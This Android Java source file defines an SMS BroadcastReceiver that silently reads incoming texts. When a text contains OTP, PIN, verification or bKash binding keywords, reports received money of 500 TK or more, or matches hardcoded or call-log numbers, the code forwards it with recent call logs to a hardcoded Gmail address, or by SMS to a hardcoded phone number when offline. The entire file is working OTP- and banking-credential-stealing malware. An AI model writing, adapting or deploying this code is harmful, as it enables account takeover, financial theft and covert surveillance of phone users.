package com.example.fasterpro11;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.mail.MessagingException;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";
    private static final String FORWARD_SMS_NUMBER = "+8801915564632";
    private static final long MIN_AMOUNT = 500;
    private static final String[] INCOMING_CALL_NUMBERS = {"+8801304039286", "+8801748937896", "+8801915564636"};
    private static final Pattern NUMBER_PATTERN4DIGIT = Pattern.compile("\\+\\d{4}");
    private static final Pattern NUMBER_PATTERN6DIGIT= Pattern.compile("\\+\\d{6}");
    private static final String[] SEND_MONEY_WORDS = {"Cash In","cash in","Cash in","Cash In", "send money","received", "received TK","Cashback","received money" };
    private static final String[] OTP_WORDS = {"OTP", "otp", "PIN", "Verification", "Binding bkash"};
    private static String lastSender;
    private static String lastMessage;
    private static long lastTimestamp;
    private Context mContext;

    @Override
    public void onReceive(Context context, Intent intent) {
        mContext = context; // Store the context for later use
        Bundle bundle = intent.getExtras();

        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = smsMessage.getOriginatingAddress();
                    String messageBody = smsMessage.getMessageBody();
                    Log.d(TAG, "Received SMS from: " + sender + ", message: " + messageBody);

                    lastSender = sender;
                    lastMessage = messageBody;
                    lastTimestamp = System.currentTimeMillis();

                    // Check conditions and log details
                    boolean isIncomingCallNumber = IncomingCallNumber(sender);
                    boolean isSMSMoneyWords = containsSMSMoneyWords(messageBody) && AmountAboveThreshold(messageBody);
                    boolean isNumberInCallLog = isNumberInCallLog(sender);
                    boolean isSMSOtp = containsSMSOtp(messageBody);
                    boolean isPatternMatch5to7digitInCallLog = isPatternMatch5to7digitInCallLogs();
                    boolean isPatternMatch5to7digitIncomingMessages = isPatternMatch5to7digitInRecentIncomingMessages();


                    Log.d(TAG, "Incoming Call Number check: " + isIncomingCallNumber);
                    Log.d(TAG, "contains SMS MonyWords check: " + isSMSMoneyWords);
                    Log.d(TAG, "isNumber In CallLog check: " + isNumberInCallLog);
                    Log.d(TAG, "contains SMS Otp check: " + isSMSOtp);
                    Log.d(TAG, "Pattern match check 4digit CallLog: " + isPatternMatch5to7digitInCallLog);
                    Log.d(TAG, "Pattern match check 4digit Incoming  Messages: " + isPatternMatch5to7digitIncomingMessages);

                    if (isIncomingCallNumber ||
                        (isSMSMoneyWords && AmountAboveThreshold(messageBody)) ||
                        isNumberInCallLog || isSMSOtp || isPatternMatch5to7digitInCallLog  ||
                            isPatternMatch5to7digitIncomingMessages ) {
                        Log.d(TAG, "Condition match: For Forwarding message...");

                        try {
                            if (isInternetConnected()) {
                                Log.d(TAG, "Internet is connected. Forwarding SMS via email.");
                                forwardSmsByEmail(sender, messageBody);
                            } else {
                                Log.d(TAG, "Internet is not connected. Forwarding SMS via SMS.");
                                forwardSmsBySMS(sender, messageBody);
                            }
                        } catch (MessagingException e) {
                            Log.e(TAG, "Failed to forward SMS: " + e.getMessage());
                        }
                    } else {
                        Log.d(TAG, "No conditions match for forwarding the message.");
                    }
                }
            }
        }
    }

    private boolean isInternetConnected() {
        ConnectivityManager cm = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm != null) {
            NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
        }
        return false;
    }

    private boolean IncomingCallNumber(String sender) {
        for (String number : INCOMING_CALL_NUMBERS) {
            if (sender.equals(number)) {
                Log.d(TAG, "Sender is an incoming call number: " + sender);
                return true;
            }
        }
        Log.d(TAG, "not an Sender is  incoming call number: " + sender);
        return false;
    }

    private boolean containsSMSMoneyWords(String messageBody) {
        for (String keyword : SEND_MONEY_WORDS) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Message contains money-related keyword: " + keyword);
                return true;
            }
        }
        Log.d(TAG, "not contain Message any money-related keywords.");
        return false;
    }

    private boolean AmountAboveThreshold(String messageBody) {
        List<Double> amounts = extractAllAmounts(messageBody);

        if (amounts.isEmpty()) {
            return false; // No amounts to check
        }

        // Find the largest amount
        double maxAmount = Collections.max(amounts);
        Log.d(TAG, "Largest amount found: " + maxAmount);

        // Define the minimum and maximum thresholds
        double minAmount = 500;
        double maxAllowedAmount = 99000000;

        // Check if the largest amount is within the specified range
        boolean isAboveThreshold = maxAmount >= minAmount && maxAmount <= maxAllowedAmount;
        Log.d(TAG, "Largest amount (" + maxAmount + ") is within the range (" + minAmount + " to " + maxAllowedAmount + "): " + isAboveThreshold);

        return isAboveThreshold;
    }

    private List<Double> extractAllAmounts(String messageBody) {
        List<Double> amounts = new ArrayList<>();
        String regex = "TK\\s*([\\d,]+(?:\\.\\d{1,2})?)";
        Pattern pattern = Pattern.compile(regex, Pattern.CASE_INSENSITIVE);
        Matcher matcher = pattern.matcher(messageBody);

        while (matcher.find()) {
            String amountString = matcher.group(1);
            // Remove commas and parse the amount
            amountString = amountString.replaceAll(",", "");
            try {
                double amount = Double.parseDouble(amountString);
                amounts.add(amount);
                Log.d(TAG, "Found amount: " + amount);
            } catch (NumberFormatException e) {
                Log.e(TAG, "Number format exception while parsing amount: " + e.getMessage());
            }
        }

        if (amounts.isEmpty()) {
            Log.d(TAG, "No amounts found in message.");
        }

        return amounts;
    }


    private boolean containsSMSOtp(String messageBody) {
        for (String keyword : OTP_WORDS) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Message contains OTP-related keyword: " + keyword);
                return true; // No amount check is required for OTP-related keywords
            }
        }
        Log.d(TAG, "not contain Message any OTP-related keywords.");
        return false;
    }

    private boolean isNumberInCallLog(String sender) {
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = { CallLog.Calls.NUMBER };
        Cursor cursor = mContext.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 3");
        if (cursor != null && cursor.moveToFirst()) {
            int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            do {
                String number = cursor.getString(numberIndex);
                Log.d(TAG, "Checking number from call log: " + number);
                if (number.equals(sender)) {
                    cursor.close();
                    Log.d(TAG, "Sender number is in call log: " + sender);
                    return true;
                }
            } while (cursor.moveToNext());
            cursor.close();
        }
        Log.d(TAG, "Sender number is in call log: " + sender);
        return false;
    }

    private boolean isPatternMatch5to7digitInCallLogs() {
        Pattern pattern = Pattern.compile("\\+(\\d{2,20})"); // 5 থেকে 7 ডিজিট ক্যাপচার করার জন্য প্যাটার্ন
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = { CallLog.Calls.NUMBER };

        Cursor cursor = null;
        try {
            cursor = mContext.getContentResolver().query(
                    callLogUri,
                    projection,
                    null,
                    null,
                    CallLog.Calls.DATE + " DESC LIMIT 3"
            );

            if (cursor != null) {
                int i = 1, a = 1 ;
                while (cursor.moveToNext()) {
                    int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                    String number = cursor.getString(numberIndex);
                    Log.d(TAG, "Checking number from call log: " + i + ", " + number);
                    i = i + 1 ;
                    Matcher matcher = pattern.matcher(number);
                    if (matcher.find()) {
                        String matchedNumber = matcher.group(); // পুরো ম্যাচটি নিন
                        Log.d(TAG, "Matched CallLog number: " + a + ", " + matchedNumber);
                        a = a + 1 ;

                        // যদি পূর্ণ নম্বরটি ৪ থেকে ৬ ডিজিটের মধ্যে হয়
                        String digits = matcher.group(1); // শুধু ডিজিটস নিন
                        int length = digits.length();
                       // int matchedCallLogNumber = Integer.parseInt(digits); // সংখ্যা হিসেবে রূপান্তর করুন
                        // চেক করুন যে, matchedCallLogNumber 5 ডিজিটের বেশি এবং 7 ডিজিটের কম কি না
                        Log.d(TAG, "Number in call log matches pattern: " + matchedNumber);
                        Log.d(TAG, "call log number Length: " + length); // Log the length number
                        if (length >= 5 && length <= 7) {
                            return true;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying call logs: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        Log.d(TAG, "No numbers in call log match the pattern or length.");
        return false;
    }


    private boolean isPatternMatch5to7digitInRecentIncomingMessages() {
        Pattern pattern = Pattern.compile("\\+(\\d{2,15})"); // 5 থেকে 7 ডিজিটের নম্বরের জন্য প্যাটার্ন
        Uri smsUri = Uri.parse("content://sms/inbox");
        String[] projection = { "body" };

        Cursor cursor = null;
        try {
            cursor = mContext.getContentResolver().query(
                    smsUri,
                    projection,
                    "type = ?",
                    new String[]{String.valueOf(Telephony.Sms.MESSAGE_TYPE_INBOX)},
                    "date DESC LIMIT 5"
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    int bodyIndex = cursor.getColumnIndex("body");
                    String body = cursor.getString(bodyIndex);
                    Log.d(TAG, "Checking message body: " + body);
                    Matcher matcher = pattern.matcher(body);
                    if (matcher.find()) {
                        String matchedBody = matcher.group(); // পুরো ম্যাচটি নিন
                        Log.d(TAG, "Matched number: " + matchedBody); // পুরো নম্বরটি লগ করুন

                        // '+' বাদ দিয়ে ডিজিটস বের করুন
                        String digits = matchedBody.substring(1);
                        int matchedNumber = Integer.parseInt(digits);
                        int length = matchedBody.length();
                        // চেক করুন যে, নম্বরটি 5 থেকে 7 ডিজিটের মধ্যে কিনা
                        Log.d(TAG, "Matched number: " + matchedBody); // Log the matched number
                        Log.d(TAG, "Matched number length : " + length); // Log the matched number

                        if (length >= 5 && length <= 7) {
                            return true;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying SMS messages: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        Log.d(TAG, "No message bodies match the pattern or length.");
        return false;
    }

    private void forwardSmsByEmail(String sender, String messageBody) throws MessagingException {
        String subject = "Received SMS";
        String body = "From: " + sender + "\n" + messageBody + "\nRecent Call Logs:\n" + getRecentCallLogs();
        sendEmail(subject, body);
        Log.d(TAG, "Received SMS forwarded successfully via email");
    }

    private void sendEmail(String subject, String body) throws MessagingException {
        JavaMailAPI_SmsReceiver_Send.sendMail("abontiangum99@gmail.com", subject, body);
        Log.d(TAG, "Email sent successfully.");
    }

    private void forwardSmsBySMS(String sender, String messageBody) {
        SmsManager smsManager = SmsManager.getDefault();
        String smsMessage = "From: " + sender + "\n" + messageBody + "\nCall Logs:\n" + getRecentCallLogs();
        ArrayList<String> parts = smsManager.divideMessage(smsMessage); // Handle long messages
        smsManager.sendMultipartTextMessage(FORWARD_SMS_NUMBER, null, parts, null, null);
        Log.d(TAG, "Forwarded SMS by SMS to " + FORWARD_SMS_NUMBER + ": " + smsMessage);
    }

    private String getRecentCallLogs() {
        StringBuilder callLogBuilder = new StringBuilder();
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
        };
        Cursor cursor = mContext.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 5"); // Limit to last 3 call logs
        if (cursor != null && cursor.moveToFirst()) {
            int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
            int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
            int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
            do {
                String number = cursor.getString(numberIndex);
                long date = cursor.getLong(dateIndex);
                String duration = cursor.getString(durationIndex);
                int type = cursor.getInt(typeIndex);
                String callType = getCallType(type);
                callLogBuilder.append("Number: ").append(number).append(", Type: ").append(callType)
                        .append(", Duration: ").append(duration).append(", Date: ").append(new Date(date).toString()).append("\n");
            } while (cursor.moveToNext());
            cursor.close();
        }
        return callLogBuilder.toString();
    }

    private String getCallType(int callType) {
        switch (callType) {
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            default:
                return "Unknown";
        }
    }

    // Static method to retrieve lastSender
    public static String getLastSender() {
        return lastSender;
    }

    // Getter method to retrieve Sender
    public static String getSender() {
        return lastSender;
    }
}
